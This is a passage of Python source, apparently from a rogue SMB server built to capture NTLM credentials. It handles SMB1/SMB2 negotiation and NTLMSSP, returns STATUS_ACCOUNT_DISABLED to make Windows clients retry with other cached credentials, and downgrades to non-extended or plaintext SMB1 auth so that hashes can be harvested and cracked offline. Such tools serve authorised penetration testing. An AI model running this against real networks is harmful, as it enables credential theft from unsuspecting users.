                dns_tree = cfg.ntlm_dns_tree

                challenge = NTLM_AUTH_CreateChallenge(
                    negotiate,
                    nb_computer,
                    dns_domain,
                    challenge=cfg.ntlm_challenge,
                    disable_ess=cfg.ntlm_disable_ess,
                    disable_ntlmv2=cfg.ntlm_disable_ntlmv2,
                    target_type=cfg.ntlm_target_type,
                    version=cfg.ntlm_version,
                    nb_computer=nb_computer,
                    nb_domain=nb_domain,
                    dns_computer=dns_computer,
                    dns_domain=dns_domain,
                    dns_tree=dns_tree,
                )
                self.log_server("NTLMSSP_CHALLENGE_MESSAGE", command_name)
                if is_gssapi:
                    resp = build_neg_token_resp(
                        NEG_STATE_ACCEPT_INCOMPLETE,
                        challenge.getData(),
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                else:
                    resp = challenge

                # [MS-SMB2] §3.3.5.5.3: auth still in progress
                error_code = nt_errors.STATUS_MORE_PROCESSING_REQUIRED

            case 0x02:  # [MS-NLMP] §2.2.1.2: CHALLENGE_MESSAGE — unexpected
                if not is_gssapi:
                    self.log_client("NTLMSSP_CHALLENGE_MESSAGE", command_name)
                self.logger.debug("NTLM challenge message not supported!")
                raise BaseProtoHandler.TerminateConnection

            case 0x03:  # [MS-NLMP] §2.2.1.3: AUTHENTICATE_MESSAGE
                authenticate = ntlm.NTLMAuthChallengeResponse()
                authenticate.fromString(token)
                if not is_gssapi:
                    self.log_client("NTLMSSP_AUTHENTICATE_MESSAGE", command_name)

                # Log the final negotiated NTLMSSP flags
                try:
                    auth_flags: int = authenticate["flags"]
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP final flags: 0x{auth_flags:08x}",
                        is_client=True,
                    )
                except Exception:
                    self.logger.debug(
                        "Failed to extract NTLMSSP auth flags",
                    )

                NTLM_report_auth(
                    authenticate,
                    challenge=cfg.ntlm_challenge,
                    client=self.client_address,
                    session=self.config,
                    logger=self.logger,
                    negotiate_info=self.client_info,
                )

                # Multi-credential capture: returns STATUS_ACCOUNT_DISABLED or final error
                error_code = self.resolve_auth_error_code()
                resp = build_neg_token_resp(NEG_STATE_REJECT)

            case message_type:
                self.log_client(f"NTLMSSP: unknown {message_type:02x}", command_name)
                raise BaseProtoHandler.TerminateConnection

        return resp.getData(), error_code

    # -- Multi-credential capture --

    def resolve_auth_error_code(self) -> int:
        """Determine the NTSTATUS error code for the current auth attempt.

        Windows SSPI retries authentication with alternate cached
        credentials when it receives STATUS_ACCOUNT_DISABLED (0xC0000072).
        This allows capturing multiple credential hashes per connection
        (e.g., the interactive user's hash AND a service account hash).

        If more captures remain (auth_attempt_count < CapturesPerConnection),
        returns STATUS_ACCOUNT_DISABLED to trigger the retry. On the final
        attempt, returns the configured error code (default: STATUS_SMB_BAD_UID)
        which ends the session.

        :return: NTSTATUS code -- STATUS_ACCOUNT_DISABLED for intermediate
            attempts, or the configured final error code
        :rtype: int
        """
        self.auth_attempt_count += 1
        max_captures = self.smb_config.smb_captures_per_connection

        if self.auth_attempt_count < max_captures:
            return STATUS_ACCOUNT_DISABLED
        return self.smb_config.smb_error_code

    # -- SMB2 command handlers --

    def smb3_neg_context_pad(self, data_len: int) -> bytes:
        """Compute padding bytes for 8-byte alignment of negotiate contexts.

        [MS-SMB2] §2.2.4: padding between negotiate contexts for 8-byte
        alignment. Spec does not mandate a pad value; Windows uses 0x00.

        :param data_len: Current data length to pad from
        :type data_len: int
        :return: Zero-filled padding bytes (0 to 7 bytes)
        :rtype: bytes
        """
        return b"\x00" * ((8 - (data_len % 8)) % 8)

    def smb3_build_neg_context_list(
        self,
        context_objects: list[tuple[int, bytes]],
    ) -> bytes:
        """Encode a list of SMB 3.1.1 negotiate contexts with padding.

        Each context is serialized as an :class:`SMB2NegotiateContext` structure
        followed by padding for 8-byte alignment per [MS-SMB2] §2.2.4.

        :param context_objects: List of ``(context_type, data_bytes)`` tuples
            where *context_type* is the negotiate context type ID and
            *data_bytes* is the serialized context payload
        :type context_objects: list[tuple[int, bytes]]
        :return: Concatenated and padded negotiate context list
        :rtype: bytes
        """
        context_list = b""
        for caps_type, caps in context_objects:
            context = smb3.SMB2NegotiateContext()
            context["ContextType"] = caps_type
            context["Data"] = caps
            context["DataLength"] = len(caps)

            context_list += context.getData()
            context_list += self.smb3_neg_context_pad(context["DataLength"])
        return context_list

    def smb3_get_target_capabilities(
        self, request: smb2.SMB2Negotiate
    ) -> tuple[int, ...]:
        """Extract client's preferred encryption and signing from 3.1.1 contexts.

        Parses the SMB 3.1.1 negotiate context list from the client's
        NEGOTIATE request to determine the preferred encryption cipher
        and signing algorithm. Falls back to AES-128-GCM and AES-CMAC
        defaults if parsing fails.

        :param request: Parsed SMB2 NEGOTIATE request containing 3.1.1 contexts
        :type request: smb2.SMB2Negotiate
        :return: Tuple of ``(target_cipher, target_sign)`` algorithm IDs
        :rtype: tuple[int, ...]
        """
        target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
        target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
        try:
            context_data = smb3.SMB311ContextData(request["ClientStartTime"])
            context_list_offset = context_data["NegotiateContextOffset"] - 64
            assert request.rawData is not None
            raw_context_list = request.rawData[context_list_offset:]
            offset = 0
            for _ in range(context_data["NegotiateContextCount"]):
                context = smb3.SMB2NegotiateContext(raw_context_list[offset:])
                match context["ContextType"]:
                    case smb3.SMB2_ENCRYPTION_CAPABILITIES:
                        req_enc_caps = smb3.SMB2EncryptionCapabilities(context["Data"])
                        target_cipher = uint16.from_bytes(
                            req_enc_caps["Ciphers"],
                            order=LittleEndian,
                        )
                    case 0x0008:  # SMB2_SIGNING_CAPABILITIES_ID
                        req_sign_caps = SMB2SigningCapabilities.from_bytes(
                            context["Data"]
                        )
                        target_sign = req_sign_caps.SigningAlgorithms[0]

                offset += context["DataLength"] + 8
                offset += (8 - (offset % 8)) % 8
        except Exception as e:
            self.logger.debug(f"Warning: invalid negotiate context list: {e}")
        return target_cipher, target_sign

    def build_smb2_negotiate_response(
        self,
        target_revision: int,
        request: smb2.SMB2Negotiate | None = None,
    ) -> smb2.SMB2Negotiate_Response:
        """Build an SMB2 NEGOTIATE response -- [MS-SMB2] §2.2.4.

        Constructs a complete NEGOTIATE response with server capabilities,
        realistic max sizes for direct TCP, a SPNEGO security token, and
        (for SMB 3.1.1) negotiate contexts for preauth integrity, encryption,
        and signing algorithms.

        :param target_revision: The selected SMB2 dialect hex constant
        :type target_revision: int
        :param request: The client's parsed NEGOTIATE request, used to extract
            3.1.1 negotiate contexts, defaults to None
        :type request: smb2.SMB2Negotiate | None, optional
        :return: The populated SMB2 NEGOTIATE response structure
        :rtype: smb2.SMB2Negotiate_Response
        """
        command = smb2.SMB2Negotiate_Response()
        # [MS-SMB2] §2.2.4 / §3.3.5.4: SMB2_NEGOTIATE_SIGNING_ENABLED MUST be set
        command["SecurityMode"] = 0x01
        # [MS-SMB2] §3.3.5.4: set to the common dialect
        command["DialectRevision"] = target_revision
        # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
        command["ServerGuid"] = self.server.server_guid  # type: ignore[union-attr]
        # Realistic capabilities — [MS-SMB2] §2.2.4
        command["Capabilities"] = SMB2_SERVER_CAPABILITIES
        # Realistic max sizes for direct TCP — [MS-SMB2] §2.2.4
        command["MaxTransactSize"] = SMB2_MAX_TRANSACT_SIZE
        command["MaxReadSize"] = SMB2_MAX_READ_SIZE
        command["MaxWriteSize"] = SMB2_MAX_WRITE_SIZE
        # [MS-SMB2] §2.2.4: SystemTime set to current time in FILETIME format
        command["SystemTime"] = get_server_time()
        # [MS-SMB2] §3.3.5.4: ServerStartTime SHOULD be zero <286>
        command["ServerStartTime"] = 0
        # [MS-SMB2] §2.2.4: offset from SMB2 header to Buffer (64+64=0x80)
        command["SecurityBufferOffset"] = 0x80

        # [MS-SMB2] §3.3.5.4 / [MS-SPNG] §3.2.5.2: SPNEGO negTokenInit2
        blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
        command["Buffer"] = blob.getData()
        command["SecurityBufferLength"] = len(command["Buffer"])

        if target_revision == smb2.SMB2_DIALECT_311:
            # [MS-SMB2] §2.2.3.1.1 SMB2_PREAUTH_INTEGRITY_CAPABILITIES
            int_caps = smb3.SMB2PreAuthIntegrityCapabilities()
            int_caps["HashAlgorithmCount"] = 1
            int_caps["SaltLength"] = 32
            int_caps["HashAlgorithms"] = SMB2_INTEGRITY_SHA512
            int_caps["Salt"] = secrets.token_bytes(32)

            # [MS-SMB2] §2.2.3.1.2 SMB2_ENCRYPTION_CAPABILITIES
            target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
            target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
            if request:
                target_cipher, target_sign = self.smb3_get_target_capabilities(request)

            enc_caps = smb3.SMB2EncryptionCapabilities()
            enc_caps["CipherCount"] = 1
            enc_caps["Ciphers"] = uint16.to_bytes(target_cipher, order=LittleEndian)

            # [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
            sign_caps = SMB2SigningCapabilities(
                SigningAlgorithmCount=1, SigningAlgorithms=[target_sign]
            )

            context_data = self.smb3_build_neg_context_list(
                [
                    (
                        smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES,
                        int_caps.getData(),
                    ),
                    (
                        smb3.SMB2_ENCRYPTION_CAPABILITIES,
                        enc_caps.getData(),
                    ),
                    (SMB2_SIGNING_CAPABILITIES_ID, sign_caps.to_bytes()),
                ]
            )

            offset: int = 0x80 + command["SecurityBufferLength"]
            sec_buf_pad = self.smb3_neg_context_pad(
                0x80 + command["SecurityBufferLength"]
            )
            command["NegotiateContextOffset"] = offset + len(sec_buf_pad)
            command["NegotiateContextList"] = sec_buf_pad + context_data
            command["NegotiateContextCount"] = 3

        return command

    def handle_smb2_negotiate(self, packet: smb2.SMB2Packet) -> None:
        """Handle an SMB2 NEGOTIATE request from the client.

        The client sends a list of SMB2 dialect versions it supports.
        The server selects the greatest common dialect within its
        configured min/max range and responds with server capabilities,
        a SPNEGO security token, and (for SMB 3.1.1) negotiate contexts
        for preauth integrity, encryption, and signing algorithms.

        If no common dialect exists, responds with STATUS_NOT_SUPPORTED.

        Spec: [MS-SMB2] §3.3.5.4

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        :raises BaseProtoHandler.TerminateConnection: If the client sends no
            dialects or no common dialect is available
        """
        req = smb3.SMB2Negotiate(data=packet["Data"])
        dialect_count: int = req["DialectCount"]
        req_raw_dialects: list[int] = req["Dialects"]
        dialect_count = min(dialect_count, len(req_raw_dialects))

        req_dialects: list[int] = req_raw_dialects[:dialect_count]
        if len(req_dialects) == 0:
            # [MS-SMB2] §3.3.5.4: DialectCount == 0 → STATUS_INVALID_PARAMETER
            self.log_client("Client sent no dialects", "SMB2_NEGOTIATE")
            self.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
            raise BaseProtoHandler.TerminateConnection

        str_req_dialects = ", ".join([SMB2_DIALECTS.get(d, hex(d)) for d in req_dialects])
        guid = uuid.UUID(bytes_le=req["ClientGuid"])
        self.log_client(
            f"requested dialects: {str_req_dialects} (client: {guid})",
            "SMB2_NEGOTIATE",
        )

        # Extract client SecurityMode and Capabilities — [MS-SMB2] §2.2.3
        try:
            sec_mode: int = req["SecurityMode"]
            client_caps: int = req["Capabilities"]
            self.logger.debug(
                f"<SMB2_NEGOTIATE> Client SecurityMode=0x{sec_mode:04x} "
                f"Capabilities=0x{client_caps:08x}",
                is_client=True,
            )
        except Exception:
            self.logger.debug(
                "Failed to extract SMB2 negotiate client info",
            )

        # SMB 3.1.1 NegotiateContextList — [MS-SMB2] §2.2.3.1
        try:
            ctx_data: bytes = req["NegotiateContextList"] or b""
            if ctx_data:
                ctx_types = {
                    smb2.SMB2_PREAUTH_INTEGRITY_CAPABILITIES: "PREAUTH_INTEGRITY",
                    smb2.SMB2_ENCRYPTION_CAPABILITIES: "ENCRYPTION",
                    smb2.SMB2_COMPRESSION_CAPABILITIES: "COMPRESSION",
                }
                names: list[str] = []
                offset = 0
                while offset < len(ctx_data) - 4:
                    ctx = smb2.SMB2NegotiateContext(data=ctx_data[offset:])
                    ct: int = ctx["ContextType"]
                    dl: int = ctx["DataLength"]
                    names.append(ctx_types.get(ct, f"0x{ct:04x}"))
                    # Advance past header (8) + data + 8-byte alignment padding
                    offset += 8 + dl
                    offset += (8 - (offset % 8)) % 8
                if names:
                    self.logger.debug(
                        f"<SMB2_NEGOTIATE> NegotiateContexts: {', '.join(names)}",
                        is_client=True,
                    )
        except Exception:
            self.logger.debug("Failed to parse SMB2 NegotiateContextList")

        # Select greatest common dialect within configured min/max range
        cfg = self.smb_config
        dialect = max(
            (
                d
                for d in req_dialects
                if d in SMB2_NEGOTIABLE_DIALECTS
                and cfg.smb2_min_dialect <= d <= cfg.smb2_max_dialect
            ),
            default=None,
        )
        if dialect is None:
            self.logger.fail(f"Client requested unsupported dialects: {str_req_dialects}")
            # [MS-SMB2] §3.3.5.4: respond with STATUS_NOT_SUPPORTED
            err_resp = smb2.SMB2Negotiate_Response()
            self.send_smb2_command(
                err_resp.getData(),
                status=nt_errors.STATUS_NOT_SUPPORTED,
                command=smb2.SMB2_NEGOTIATE,
            )
            raise BaseProtoHandler.TerminateConnection

        command = self.build_smb2_negotiate_response(dialect, req)
        self.log_server(
            f"selected dialect: {SMB2_DIALECTS.get(dialect, hex(dialect))}",
            "SMB2_NEGOTIATE",
        )
        self.send_smb2_command(command.getData())

    def handle_smb2_session_setup(self, packet: smb2.SMB2Packet) -> None:
        """Handle an SMB2 SESSION_SETUP request.

        Carries the NTLMSSP authentication exchange wrapped in SPNEGO.
        Extracts the security token from the request, passes it to
        :meth:`handle_ntlmssp` for processing, and returns the response token
        with the appropriate NTSTATUS code (STATUS_MORE_PROCESSING_REQUIRED
        while the exchange is in progress, or the final error/success code).

        Spec: [MS-SMB2] §3.3.5.5

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        req = smb2.SMB2SessionSetup(data=packet["Data"])

        # Log PreviousSessionId — nonzero indicates session reconnection
        try:
            prev_session: int = req["PreviousSessionId"]
            if prev_session:
                self.logger.debug(
                    f"<SMB2_SESSION_SETUP> Reconnecting "
                    f"(PreviousSessionId=0x{prev_session:016x})",
                    is_client=True,
                )
        except Exception:
            self.logger.debug("Failed to extract PreviousSessionId", exc_info=True)

        command = smb2.SMB2SessionSetup_Response()

        resp_token, error_code = self.handle_ntlmssp(
            req["Buffer"], command_name="SMB2_SESSION_SETUP"
        )
        command["SecurityBufferLength"] = len(resp_token)
        # [MS-SMB2] §2.2.6: offset from header start (64 hdr + 8 fixed = 0x48)
        command["SecurityBufferOffset"] = 0x48
        command["Buffer"] = resp_token

        self.send_smb2_command(
            command.getData(),
            packet,
            status=error_code,
        )

    def handle_smb2_logoff(self, packet: smb2.SMB2Packet) -> None:
        """Handle SMB2 LOGOFF -- [MS-SMB2] §3.3.5.6.

        Logs the client logoff, resets the authenticated flag, and sends
        a successful LOGOFF response.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        self.log_client("Client requested logoff", "SMB2_LOGOFF")

        response = smb2.SMB2Logoff_Response()
        self.authenticated = False
        self.send_smb2_command(
            response.getData(),
            packet,
            status=nt_errors.STATUS_SUCCESS,
        )

    def handle_smb2_tree_connect(self, packet: smb2.SMB2Packet) -> None:
        """Minimal SMB2 TREE_CONNECT handler -- [MS-SMB2] §3.3.5.7.

        Accepts all tree connects and responds as IPC$ (pipe share).
        Logs the requested share path for intelligence gathering.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        try:
            req = smb2.SMB2TreeConnect(data=packet["Data"])
            path_bytes: bytes = req["Buffer"][: req["PathLength"]]
            # [MS-SMB2] §2.2.9: PathName is always UTF-16LE in SMB2
            path = path_bytes.decode("utf-16-le", errors="replace")
            self.logger.debug(
                f"<SMB2_TREE_CONNECT> Tree connect: {path}",
                is_client=True,
            )
            if path:
                self.client_info["path"] = path
        except Exception:
            self.log_client("Tree connect (malformed)", "SMB2_TREE_CONNECT")

        # [MS-SMB2] §2.2.10: SMB2 TREE_CONNECT Response
        resp = smb2.SMB2TreeConnect_Response()
        resp["ShareType"] = 0x02  # [MS-SMB2] §2.2.10: SMB2_SHARE_TYPE_PIPE
        resp["ShareFlags"] = 0x00000030  # [MS-SMB2] §2.2.10: NO_CACHING
        resp["Capabilities"] = 0  # [MS-SMB2] §2.2.10: no share-level caps
        resp["MaximalAccess"] = 0x001F01FF  # [MS-DTYP] §2.4.3: FILE_ALL_ACCESS
        self.send_smb2_command(resp.getData(), packet)

    # -- SMB1 command handlers --

    def handle_smb1_negotiate(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 NEGOTIATE -- [MS-SMB] §3.3.5.2.

        Parses the dialect list, checks for SMB2 upgrade, and builds
        the appropriate extended or non-extended security response.
        Supports three negotiate paths: SMB1-to-SMB2 protocol transition
        (when AllowSMB1Upgrade is enabled and SMB2 dialect strings are
        present), SMB1 extended security (NTLMSSP/SPNEGO), and SMB1
        non-extended security (raw challenge/response or plaintext).

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :raises BaseProtoHandler.TerminateConnection: If the client sends no
            dialects or does not offer NT LM 0.12 (and SMB2 upgrade is
            not available)
        """
        resp = smb.NewSMBPacket()
        resp["Flags1"] = smb.SMB.FLAGS1_REPLY
        resp["Pid"] = packet["Pid"]
        resp["Tid"] = packet["Tid"]
        resp["Mid"] = packet["Mid"]

        req = smb.SMBCommand(packet["Data"][0])
        # [MS-CIFS] §2.2.4.52.1: each dialect prefixed by 0x02
        req_data_dialects: list[bytes] = req["Data"].split(b"\x02")[1:]
        if len(req_data_dialects) == 0:
            self.log_client("Client sent no dialects", "SMB_COM_NEGOTIATE")
            self.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
            raise BaseProtoHandler.TerminateConnection

        dialects: list[str] = [
            dialect.rstrip(b"\x00").decode(errors="replace")
            for dialect in req_data_dialects
        ]
        self.log_client(f"dialects: {', '.join(dialects)}", "SMB_COM_NEGOTIATE")

        cfg = self.smb_config

        # Check for SMB2 dialect strings for protocol transition
        # [MS-SMB2] §3.3.5.3.1 — only when AllowSMB1Upgrade and EnableSMB2
        smb2_upgrade_target: str | None = None
        if cfg.smb_allow_smb1_upgrade and cfg.smb_enable_smb2:
            smb2_entries: dict[str, int] = {
                dialect: index
                for index, dialect in enumerate(dialects)
                if dialect in SMB2_DIALECT_REV
            }
            if smb2_entries:
                # Prefer "SMB 2.???" wildcard per [MS-SMB2] §3.3.5.3.1
                if "SMB 2.???" in smb2_entries:
                    smb2_upgrade_target = "SMB 2.???"
                else:
                    # Select greatest dialect by numeric value
                    smb2_upgrade_target = max(
                        smb2_entries,
                        key=lambda d: SMB2_DIALECT_REV.get(d, 0),
                    )

        if smb2_upgrade_target is not None:
            command = self.build_smb2_negotiate_response(
                SMB2_DIALECT_REV[smb2_upgrade_target]
            )
            self.log_server("Switching protocol to SMBv2", "SMB_COM_NEGOTIATE")
            self.send_smb2_command(command.getData(), command=smb2.SMB2_NEGOTIATE)
            return

        # Find NT LM 0.12 dialect — [MS-SMB] extensions only apply to it
        nt_lm_index: int | None = None
        for i, d in enumerate(dialects):
            if d == "NT LM 0.12":
                nt_lm_index = i
                break

        if nt_lm_index is None:
            self.logger.fail(
                "Client did not offer NT LM 0.12 dialect (and SMB2 upgrade not available)"
            )
            raise BaseProtoHandler.TerminateConnection

        # Shared negotiate parameters — [MS-CIFS] §2.2.4.52.2
        server_time = get_server_time()

        # Respond based on the client's capabilities: if the client sets
        # FLAGS2_EXTENDED_SECURITY, respond with SPNEGO/NTLMSSP.  If not,
        # respond with a raw 8-byte challenge so legacy and non-standard
        # clients (embedded devices, nmap, old Windows) can still
        # authenticate.  This deviates from modern Windows (which always
        # sends extended security) but ensures we capture hashes from
        # EVERY client type, not just modern ones.
        use_extended = (
            bool(packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY)
            and not cfg.smb_force_smb1_plaintext
        )

        if use_extended:
            # --- Extended security path (NTLMSSP/SPNEGO) ---
            self.smb1_extended_security = True

            # [MS-SMB] §2.2.3.1: response Flags2 for extended security negotiate
            resp["Flags2"] = (
                smb.SMB.FLAGS2_EXTENDED_SECURITY
                | smb.SMB.FLAGS2_NT_STATUS
                | smb.SMB.FLAGS2_UNICODE
                | smb.SMB.FLAGS2_LONG_NAMES
            )

            _dialects_data = smb.SMBExtended_Security_Data()
            # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
            _dialects_data["ServerGUID"] = self.server.server_guid  # type: ignore[union-attr]
            blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
            _dialects_data["SecurityBlob"] = blob.getData()

            _dialects_parameters = smb.SMBExtended_Security_Parameters()
            _dialects_parameters["Capabilities"] = (
                smb.SMB.CAP_EXTENDED_SECURITY
                | smb.SMB.CAP_USE_NT_ERRORS
                | smb.SMB.CAP_NT_SMBS
                | smb.SMB.CAP_UNICODE
            )
            _dialects_parameters["ChallengeLength"] = 0
        else:
            # --- Non-extended security path (raw challenge/response) ---
            # [MS-SMB] §2.2.4.5.2.2
            self.smb1_extended_security = False
            self.smb1_challenge = cfg.ntlm_challenge

            # [MS-SMB] §2.2.3.1: response Flags2 for non-extended security
            # NO FLAGS2_EXTENDED_SECURITY; include UNICODE + LONG_NAMES
            resp["Flags2"] = (
                smb.SMB.FLAGS2_NT_STATUS
                | smb.SMB.FLAGS2_UNICODE
                | smb.SMB.FLAGS2_LONG_NAMES
            )

            _dialects_parameters = smb.SMBNTLMDialect_Parameters()
            _dialects_data = smb.SMBNTLMDialect_Data()

            # SecurityMode — [MS-CIFS] §2.2.4.52.2
            if cfg.smb_force_smb1_plaintext:
                # Clear NEGOTIATE_ENCRYPT_PASSWORDS → plaintext passwords
                _dialects_parameters["SecurityMode"] = smb.SMB.SECURITY_SHARE_USER
                _dialects_parameters["ChallengeLength"] = 0
                self.smb1_negotiate_encrypt = False
            else:
                _dialects_parameters["SecurityMode"] = (
                    smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
                )
                _dialects_parameters["ChallengeLength"] = 8
                _dialects_data["Challenge"] = cfg.ntlm_challenge
                self.smb1_negotiate_encrypt = True

            # Capabilities — NO CAP_EXTENDED_SECURITY
            _dialects_parameters["Capabilities"] = (
                smb.SMB.CAP_USE_NT_ERRORS | smb.SMB.CAP_NT_SMBS | smb.SMB.CAP_UNICODE
            )

            # DomainName and ServerName — [MS-CIFS] §2.2.4.52.2
            # Payload is the raw concatenation of DomainName + ServerName;
            # the virtual DomainName/ServerName fields are parse-time only.
            _dialects_data["Payload"] = smbserver.encodeSMBString(
                resp["Flags2"], cfg.smb_nb_domain
            ) + smbserver.encodeSMBString(resp["Flags2"], cfg.smb_nb_computer)

            _dialects_parameters["DialectIndex"] = nt_lm_index
            _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
            _dialects_parameters["MaxNumberVcs"] = 1
            _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
            _dialects_parameters["MaxRawSize"] = 65536
            _dialects_parameters["SessionKey"] = 0
            # [MS-CIFS] §2.2.4.52.2: SystemTime as FILETIME split into 32-bit words
            _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
            _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
            _dialects_parameters["ServerTimeZone"] = 0

            command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
            command["Data"] = _dialects_data
            command["Parameters"] = _dialects_parameters

            self.log_server(
                "selected dialect: NT LM 0.12 (non-extended)",
                "SMB_COM_NEGOTIATE",
            )
            resp.addCommand(command)
            self.send_data(resp.getData())
            return

        # Extended security common path
        _dialects_parameters["DialectIndex"] = nt_lm_index
        _dialects_parameters["SecurityMode"] = (
            smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
        )
        _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
        _dialects_parameters["MaxNumberVcs"] = 1
        _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
        _dialects_parameters["MaxRawSize"] = 65536
        _dialects_parameters["SessionKey"] = 0
        # SystemTime must be current FILETIME — [MS-CIFS] §2.2.4.52.2
        _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
        _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
        _dialects_parameters["ServerTimeZone"] = 0

        command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
        command["Data"] = _dialects_data
        command["Parameters"] = _dialects_parameters

        self.log_server("selected dialect: NT LM 0.12", "SMB_COM_NEGOTIATE")
        resp.addCommand(command)
        self.send_data(resp.getData())

    def handle_smb1_session_setup(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 SESSION_SETUP_ANDX -- [MS-SMB] §3.3.5.3.

        Dispatches to extended security (WordCount=12, NTLMSSP/SPNEGO via
        :meth:`handle_ntlmssp`) or basic security (WordCount=13, raw
        challenge/response via :meth:`handle_smb1_session_setup_basic`).

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :raises BaseProtoHandler.TerminateConnection: If the WordCount is
            neither 12 nor 13
        """
        command = smb.SMBCommand(packet["Data"][0])
        # [MS-SMB] §2.2.4.6.1: WordCount == 0x0C for extended security
        if command["WordCount"] == 12:
            parameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            data = smb.SMBSessionSetupAndX_Extended_Response_Data(flags=packet["Flags2"])

            setup_params = smb.SMBSessionSetupAndX_Extended_Parameters(
                command["Parameters"]
            )
            setup_data = smb.SMBSessionSetupAndX_Extended_Data()
            setup_data["SecurityBlobLength"] = setup_params["SecurityBlobLength"]
            setup_data.fromString(command["Data"])

            # Extract client OS and LAN Manager identification strings.
            # impacket's AsciiOrUnicodeStructure has a UTF-16BE bug, so
            # we manually parse from raw bytes after the SecurityBlob.
            try:
                is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
                blob_len: int = setup_params["SecurityBlobLength"]
                raw_after_blob = command["Data"][blob_len:]
                # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned
                # from the start of the SMB header. When SecurityBlob has
                # even length, a 1-byte pad precedes the first Unicode string.
                if is_unicode and len(raw_after_blob) > 0 and raw_after_blob[0] == 0:
                    raw_after_blob = raw_after_blob[1:]
                parts = _split_smb_strings(raw_after_blob, is_unicode)
                client_os = parts[0] if len(parts) > 0 else ""
                client_lanman = parts[1] if len(parts) > 1 else ""
                if client_os:
                    self.client_info["smb_os"] = client_os
                if client_lanman:
                    self.client_info["smb_lanman"] = client_lanman
            except Exception:
                self.logger.debug(
                    "Failed to extract SMB1 session setup client info",
                )

            resp_token, error_code = self.handle_ntlmssp(
                setup_data["SecurityBlob"],
                command_name="SMB_COM_SESSION_SETUP_ANDX",
            )
            data["SecurityBlob"] = resp_token
            data["SecurityBlobLength"] = len(resp_token)
            parameters["SecurityBlobLength"] = len(resp_token)
            data["NativeOS"] = smbserver.encodeSMBString(
                packet["Flags2"],
                self.smb_config.smb_server_os,
            )
            data["NativeLanMan"] = smbserver.encodeSMBString(
                packet["Flags2"],
                self.smb_config.effective_native_lanman,
            )
            self.send_smb1_command(
                smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
                data,
                parameters,
                packet,
                error_code=error_code,
            )
        elif command["WordCount"] == 13:
            # Non-extended security — [MS-CIFS] §2.2.4.53.1
            self.handle_smb1_session_setup_basic(packet, command)
        else:
            self.logger.warning(
                "<SMB_COM_SESSION_SETUP_ANDX> Unsupported WordCount: "
                f"{command['WordCount']}"
            )
            raise BaseProtoHandler.TerminateConnection

    def handle_smb1_session_setup_basic(
        self,
        packet: smb.NewSMBPacket,
        command: smb.SMBCommand,
    ) -> None:
        """Handle SMB1 non-extended SESSION_SETUP_ANDX (WordCount=13).

        This path handles pre-Vista clients and embedded SMB stacks that
        don't support NTLMSSP/SPNEGO. Instead of a 3-message NTLMSSP
        exchange, the client sends raw LM and NT challenge-response hashes
        (or cleartext passwords) directly in the OEMPassword and
        UnicodePassword fields of the session setup request.

        The server sent an 8-byte challenge in the negotiate response;
        the client hashed its password against that challenge. This method
        extracts those raw hashes, classifies them (NetNTLMv1 vs NetNTLMv2
        based on response length), and formats them for offline cracking.

        Also detects two special cases:
        - Cleartext passwords when the server advertised plaintext mode
          (ForceSMB1Plaintext=true, i.e., NEGOTIATE_ENCRYPT_PASSWORDS cleared)
        - Unexpected cleartext despite challenge (non-standard response
          lengths when challenge mode was active)

        Spec: [MS-CIFS] §2.2.4.53.1 (request), §2.2.4.53.2 (response),
              §3.2.4.2.4 (plaintext-despite-challenge)

        :param packet: The original SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :param command: The parsed SMB command containing session setup parameters
            and data fields (WordCount=13)
        :type command: smb.SMBCommand
        """
        cfg = self.smb_config
        setup_params = smb.SMBSessionSetupAndX_Parameters(command["Parameters"])

        oem_len: int = setup_params["AnsiPwdLength"]
        uni_len: int = setup_params["UnicodePwdLength"]
        is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
        # [MS-CIFS] §2.2.4.53.1 — manually parse the data section.
        # impacket's AsciiStructure truncates at \x00 (wrong for Unicode)
        # and UnicodeStructure decodes as UTF-16BE (impacket bug).
        raw_data: bytes = command["Data"]
        # Password fields come first at known offsets
